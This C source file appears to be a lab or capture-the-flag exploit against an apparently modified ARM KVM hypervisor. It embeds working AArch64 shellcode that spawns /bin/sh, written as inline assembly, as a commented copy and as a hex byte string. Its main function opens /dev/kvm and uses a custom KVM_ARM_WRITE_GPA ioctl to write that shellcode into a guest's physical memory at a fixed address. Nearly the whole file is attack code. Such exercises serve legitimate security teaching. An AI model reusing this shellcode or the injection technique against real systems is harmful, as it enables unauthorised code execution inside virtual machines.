#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/types.h>
#include <sys/stat.h>
#include <fcntl.h>
#include <unistd.h>
#include <sys/ioctl.h>
#include <errno.h>
#include <stdint.h>

struct kvm_arm_write_gpa_args {
       uint32_t vmid;  // the vmid that you, as the host, want to write to (default 1)
       uint64_t gpa;   // the gpa(guest physical address) of the guest
       uint64_t data;  // address of the payload in host user space
       uint64_t size;  // size of the payload
};
#define KVMIO 0xAE
#define KVM_ARM_WRITE_GPA         _IOW(KVMIO,   0xfe, struct kvm_arm_write_gpa_args)

/*
.global shellcode
shellcode:
mov  x14, #25135
movk x14, #28265, lsl #16
movk x14, #12079, lsl #0x20
movk x14, #29487, lsl #0x
mov  x15, #104
stp x14, x15, [sp, #-16]!
mov  x0, sp
mov  x1, xzr
mov  x2, xzr
mov  x8, #221
svc 0
*/

extern void shellcode();
__asm__(".global shellcode\n"
	"shellcode:\n\t"
	/* push b'/bin///sh\x00' */
	/* Set x14 = 8299904519029482031 = 0x732f2f2f6e69622f */
 	"mov  x14, #25135\n\t"
 	"movk x14, #28265, lsl #16\n\t"
 	"movk x14, #12079, lsl #0x20\n\t"
 	"movk x14, #29487, lsl #0x30\n\t"
 	"mov  x15, #104\n\t"
 	"stp x14, x15, [sp, #-16]!\n\t"
 	/* execve(path='sp', argv=0, envp=0) */
 	"mov  x0, sp\n\t"
 	"mov  x1, xzr\n\t"
 	"mov  x2, xzr\n\t"
 	/* call execve() */
 	"mov  x8, #221\n\t" // SYS_execve 
	"svc 0");

// const char shellcode[] = "\xee\x45\x8c\xd2\x2e\xcd\xad\xf2\xee\xe5\xc5\xf2\xee\x3f\xbf\xa9\xe0\x03\x00\x91\xe1\x03\x1f\xaa\xe2\x03\x1f\xaa\xa8\x1b\x80\xd2\x01\x00\x00\xd4";

int main(int argc, char *argv[])
{
	struct kvm_arm_write_gpa_args wgpa = {
                .vmid = 1,
		.gpa = 0x4368b71c,
		.data = (unsigned long)shellcode,
                .size = 100,
	};
	// TODO: implement your shellcode injection attack
        // printf("get size of shell code: %lu\n",wgpa.size);
        int fd;
        int32_t value, number;
        printf("*********************************\n");
        printf("\nOpening Driver\n");
        fd = open("/dev/kvm", O_RDWR);
        if(fd < 0) {
                printf("Cannot open device file...\n");
                return 0;
        }
        int result = ioctl(fd, KVM_ARM_WRITE_GPA, &wgpa); 
        if(result == -1){
                printf("errON[%d]errMsg[%s]\n",errno,strerror(errno));
        }
        printf("Value is %d\n", result);
        printf("Closing Driver\n");
        close(fd);
}
